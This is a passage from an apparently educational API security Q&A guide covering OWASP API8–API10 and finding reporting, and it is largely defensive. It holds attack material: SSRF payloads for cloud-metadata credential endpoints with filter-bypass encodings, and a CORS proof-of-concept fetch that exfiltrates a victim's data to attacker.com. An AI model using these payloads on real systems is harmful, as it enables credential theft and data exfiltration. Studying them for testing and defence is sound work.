Avoid fetching client URLs where possible; else **allow-list** schemes/hosts/ports and **re-validate after redirects**; block internal ranges + metadata at the network layer (egress filtering, **IMDSv2**); resolve-and-pin DNS; disable unused schemes; isolate the fetcher; don't return the raw fetch response. CWE: **CWE-918**.

### Q74a. Give the cloud-metadata endpoints an API SSRF targets (+ IMDSv2).
- **AWS (IMDSv1):** `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → temp keys. **IMDSv2** needs a token: `PUT /latest/api/token` + `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then `X-aws-ec2-metadata-token` on the GET.
- **GCP:** `/computeMetadata/v1/instance/service-accounts/default/token` + `Metadata-Flavor: Google`.
- **Azure:** `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=…` + `Metadata: true`.

Filter bypasses: decimal `2852039166`, `[::ffff:169.254.169.254]`, `http://allowed@169.254.169.254/`, DNS rebinding, redirect-to-internal. Stolen creds → `aws sts get-caller-identity` (read-only proof) → cloud takeover. Enforce IMDSv2 + egress filtering. → `../Web/SSRF/`.

---

# §API8 — SECURITY MISCONFIGURATION

**Core**

### Q75. What's the scope of API8?
Insecure/default configuration across the API stack — servers, gateways, frameworks, cloud — including missing hardening, unnecessary features/methods, **permissive CORS**, missing/misapplied security headers, **verbose errors** leaking internals, unpatched systems, missing TLS, and improper transport/parsing (content-type/HPP confusion).

**How to test**

### Q76. How do you test for API8?
**CORS** (reflected `Origin`/`null` + `Access-Control-Allow-Credentials:true` → cross-origin theft of authed responses → `../Web/CORS/`); **verbose errors** (bad types/malformed JSON → stack traces/versions/paths/secrets); **security headers/TLS**; **HTTP methods** (TRACE/PUT/OPTIONS enabled); **content-type & HPP** (switch JSON↔form↔XML to bypass validation/WAF; duplicate params → parser divergence); cached sensitive responses (→ `../Web/WebCache/`); Host handling (→ `../Web/HostHeader/`); exposed docs/debug/default-creds (→ `../Web/Recon/`).

### Q77. What is content-type confusion and HPP in an API context?
**Content-type confusion**: send the same data as a different type (JSON↔form↔XML) than the validator/WAF expects, so it parses differently downstream → filter/validation bypass. **HPP** (HTTP Parameter Pollution): duplicate parameters (`?role=user&role=admin`) that front-end and back-end resolve differently → last-wins/first-wins divergence → bypass.

**Red-team / escalation**

### Q78. How does permissive CORS become a breach in an API?
If the API reflects an arbitrary `Origin` and sets `Access-Control-Allow-Credentials: true`, an attacker's page can make **authenticated** cross-origin API calls in the victim's browser and **read** the responses → steal the victim's private data (profile, tokens, messages). It's authenticated data exfiltration via the browser. → `../Web/CORS/`.

**Interview**

### Q79. "What does `Access-Control-Allow-Origin: *` mean, and when is it dangerous?"
It allows *any* origin to read the response — **safe only for public, unauthenticated data**. It's dangerous when combined with credentials (browsers actually *forbid* `*` + credentials, so misconfigs instead **reflect the Origin** + `Allow-Credentials: true`, which *is* exploitable). The real bug is reflecting arbitrary origins with credentials.

### Q80. "You get a stack trace with the framework version and a file path from an API error. Impact?"
**API8 (info disclosure via verbose errors).** Impact: fingerprints the stack for **API6/A06 CVE** targeting, leaks internal paths/logic aiding other attacks, sometimes leaks secrets/connection strings. Low on its own, but a strong *enabler*. Fix: generic error responses, log details server-side.

**Prevention**

### Q81. Prevention for API8?
Harden by default + automated config/patch management; strict CORS (exact-origin allow-list, no reflect-with-credentials, no `null`); disable unnecessary methods/features; security headers everywhere; **generic errors** (log details server-side); TLS everywhere; consistent content-type/param handling; lock down docs/debug endpoints + cloud storage; drift detection.

### Q82. CWEs for API8?
CWE-16 (configuration), CWE-209 (error-message info exposure), CWE-388, CWE-942 (permissive CORS), CWE-444 (request smuggling/HPP-adjacent), CWE-668.

### Q82a. Show the PoC for a permissive-CORS → data-theft finding.
If the API **reflects an arbitrary `Origin`** and sets `Access-Control-Allow-Credentials: true`, an attacker page reads the victim's authenticated responses cross-origin. PoC on `attacker.com`: `fetch('https://api.target.com/me',{credentials:'include'}).then(r=>r.text()).then(d=>new Image().src='https://attacker.com/log?d='+encodeURIComponent(d))`. A logged-in victim visits → their browser sends their cookies → the API echoes `Access-Control-Allow-Origin: https://attacker.com` + `…Credentials: true` → the script exfiltrates the private response. (Browsers *forbid* `ACAO: *` + credentials, so the exploitable bug is always *reflecting the origin* — or trusting `null` — with credentials on.) → `../Web/CORS/`.

---

# §API9 — IMPROPER INVENTORY MANAGEMENT

**Core**

### Q83. What is API9 and what did it used to be called?
Lacking an accurate inventory of **API endpoints and versions** (and of **data flows to third parties**), so **shadow APIs** (undocumented), **deprecated/legacy versions** (`/v1` still live, unpatched), **debug/test/staging** endpoints, and **exposed non-prod hosts** persist unmonitored. Formerly "Improper Assets Management."

### Q84. Why is the un-inventoried endpoint the dangerous one?
Because **the old/shadow endpoint has the bug the new one fixed.** A deprecated `/v1` that skips a later authz fix; a debug endpoint with no auth; a staging host with prod data. API9 doesn't cause an exploit by itself — it **exposes every other category on forgotten surface**.

**How to test**

### Q85. How do you discover shadow/legacy endpoints?
Enumerate all versions/endpoints (`/v1`../`v2`../`v3`, `/api`../`api-internal`../`beta`; route brute with **`kiterunner`**/`ffuf` + API wordlists, **`arjun`** for hidden params → `../Web/Recon/`); mine JS bundles, mobile decompile, **Swagger/OpenAPI** (`/swagger.json`, `/openapi.json`, `/api-docs`), **GraphQL introspection** (InQL / `graphql-cop`), Wayback (`gau`/`waybackurls`), git history, error messages (→ `../Web/JSFiles/`, `GraphQL/`); find non-prod hosts (staging/dev/uat subdomains → `../Web/SubdomainTakeover/`); probe debug/internal (`/debug`, `/actuator`, `/metrics`, `/health`). Then **re-run the API1/API2/API3/API5 tests against the old versions** — the fix usually landed only on the current one (Q86).

### Q86. What's the key move once you find an old version?
**Re-run the API1/API2/API3/API5 tests against `/v1` and legacy routes** — the fix often landed only on the current version. The shadow endpoint frequently still has the BOLA/auth/mass-assign bug that was patched on `/v2`. This is a recurring high-bounty pattern ("the old API").

**Red-team / escalation**

### Q87. Why are staging/non-prod hosts a red-team goldmine?
They often carry **prod data** with **weaker controls** (debug on, default creds, no rate limit, verbose errors, old code). Finding `staging-api.target.com` with real data and lax auth can be a faster path to a breach than the hardened prod API. Enumerate subdomains and test them as first-class targets.

**Interview**

### Q88. "How would you find undocumented API endpoints on a target?"
JS-bundle analysis (routes/fetch calls), mobile-app decompile, Swagger/OpenAPI/GraphQL introspection, historical data (Wayback, git), path/param brute (ffuf/kiterunner with API wordlists), and diffing old vs new API versions. Then test the shadow/old ones for bugs fixed elsewhere.

### Q89. "What's the risk of leaving `/v1` running after shipping `/v2`?"
`/v1` may **lack security fixes** applied to `/v2` (authz checks, input validation, rate limits) — attackers simply use the old version to bypass the new controls. Deprecated endpoints must be **decommissioned**, not just hidden. This is API9 in one sentence.

**Prevention**

### Q90. Prevention + CWEs for API9?
Maintain a live **API inventory** (all endpoints/versions/environments/owners) + a current OpenAPI spec; **retire** deprecated versions (don't just hide); segregate + access-control non-prod (no prod data); document third-party data flows; automated discovery + external attack-surface monitoring. CWEs: CWE-1059 (incomplete documentation-of-design), CWE-1006, CWE-668 (exposure).

---

# §API10 — UNSAFE CONSUMPTION OF APIS

**Core**

### Q91. What is API10 (new in 2023) and how does it flip the usual direction?
> *Plain version:* it flips the usual worry. Normally you distrust the *users* calling your API. But your API also **calls other** APIs (payment, a partner) and trusts their replies blindly — so if one of those gets hijacked, its poison flows straight into you. Distrust the services you *call*, too.

The app **trusts data from other APIs it consumes** (third-party/partner/upstream) more than user input, applying weaker security to those integrations — following redirects blindly, not validating upstream responses, no timeouts. The risk comes from **the services you call**, not just the clients that call you.

### Q92. What's the impact?
A **compromised/malicious upstream** (or MITM/redirect into one) feeds your app data it processes unsafely → **injection** (upstream response → SQLi/XSS/deserialization in your app), **SSRF/redirect chaining** (blindly following an upstream redirect to an internal target), **data poisoning**, or **secondary compromise** propagated from the partner. The API-integration face of supply-chain risk.

**How to test**

### Q93. How do you test for unsafe consumption?
Map upstream integrations (payment, KYC, geo, enrichment, inbound webhooks, OAuth `userinfo`, aggregators). Ask: is the upstream response **validated/sanitized like user input**, or trusted? Where you can control an integration (a webhook you register, a MITM, a partner sandbox), feed a **malicious upstream response** → does it become injection at a sink (→ `../Web/SQLi/`, `../Web/XSS/`, `../Web/Deserialization/`)? Does the app follow upstream **redirects** blindly → internal (→ `../Web/SSRF/`)?

**Red-team / escalation**

### Q94. Give a concrete API10 chain.
You register a **webhook** (or control a partner sandbox) that your target consumes. Your endpoint returns a redirect to `http://169.254.169.254/…` (target follows blindly → **SSRF**) or returns a JSON field the target concatenates into a SQL query / renders in an admin panel (**SQLi/stored XSS**). The trust in "it's our partner's API" is the vulnerability.

**Interview**

### Q95. "Why treat responses from a trusted third-party API as untrusted?"
Because the third party can be **compromised, malicious, or MITM'd**, and you don't control their security. If you pipe their data into a DB, HTML, a deserializer, or a redirect without validation, their breach becomes yours. Zero-trust applies to *inbound integration data*, not just end-user input.

### Q96. "What's the difference between API10 and A06/A08 supply chain?"
A06/A08 are about **components/dependencies you bundle** (libraries, packages, build pipeline). API10 is about **runtime data from external APIs you call**. Both are supply-chain trust, but A06/A08 = code you ship; API10 = data you consume at runtime. Different mitigations (SBOM/signing vs input-validating upstream responses).

**Prevention**

### Q97. Prevention + CWEs for API10?
**Treat consumed-API data as untrusted input** — validate/sanitize/encode for the sink like client input; don't blindly follow integration redirects (allow-list); TLS + cert validation + timeouts + resource bounds on upstream calls; schema-validate upstream data; isolate integration processing; vet + monitor third parties. CWEs: CWE-20 (improper input validation), CWE-345, CWE-502 (if deserializing upstream), CWE-918 (redirect→SSRF).

---

# §XC — CROSS-CATEGORY CHAINING & REPORTING

### Q98. What's the canonical API kill chain?
**API9** (discover a shadow `/v1`) → **API2** (its auth is weak / a leaked key) → **API1 BOLA** (enumerate every user's objects, unthrottled via **API4**) → **API3** (mass-assign `isAdmin`) or **API5 BFLA** (call an admin function) → admin takeover → **API7 SSRF** via a webhook → cloud metadata → cloud takeover. Discovery → auth → authorization → escalation → cloud.

### Q99. Which API risks are "enablers" vs "finishers"?
**Enablers**: API9 (find surface), API4 (volume for enumeration/brute), API8 (info leak), API2 (identity). **Finishers**: API1/API5/API3 (data/privilege), API7 (cloud takeover), API6 (business/financial harm), API10 (injection from upstream). Reports should show the enabler→finisher path.

### Q100. Why is the two-account method the single most important API skill?
Because API1/API3/API5 — three of the top five — are all authorization bugs that only reveal themselves when you compare what **user A** can do vs what **user B** should be blocked from. One account can't prove an authorization boundary; two accounts (plus Autorize automation) find the highest-value API bugs quickly and with low false positives.

### Q101. How do you keep API findings low-FP?
Two accounts for every authz claim; confirm **persistence** for mass-assignment (follow-up read); confirm blind SSRF with **OOB**; baseline before claiming a differential; prove **impact** ("as A I read/modified B's object / called an admin function"), not a 200. Reproducible + benign-marker = triager-proof.

### Q102. How do you rate and report an API finding?
Impact-first, then API-ID + CWE + CVSS: "Swap `account_id` on `GET /api/v1/accounts/{id}/statements` → read any customer's statements as a standard user → **API1 BOLA / IDOR**, CWE-639, CVSS 7.5 (raise if writable/mass-scale)." For API9, rate the *underlying* bug on the shadow endpoint, not the inventory gap.

### Q103. "Web Top 10 vs API Top 10 — when do you use which frame?"
Use the **API Top 10** when the target is an API surface (mobile/SPA backend, partner API, GraphQL) — it centers the authorization-granularity and business-flow risks that matter there. Use the **Web Top 10** for classic server-rendered apps. They overlap on injection/SSRF/auth; pick the frame that names the target's real risks (and note both if relevant).

### Q104. The one meta-lesson of the API Top 10?
**Authenticate once, authorize every time — at the object, function, and property level.** APIs hand attackers the IDs and endpoints directly, with no UI to hide behind, so a valid token is not permission. Enumerate the whole surface (including shadow/old versions), run the two-account differential on every object and function, and treat both client input *and* upstream-API data as untrusted.
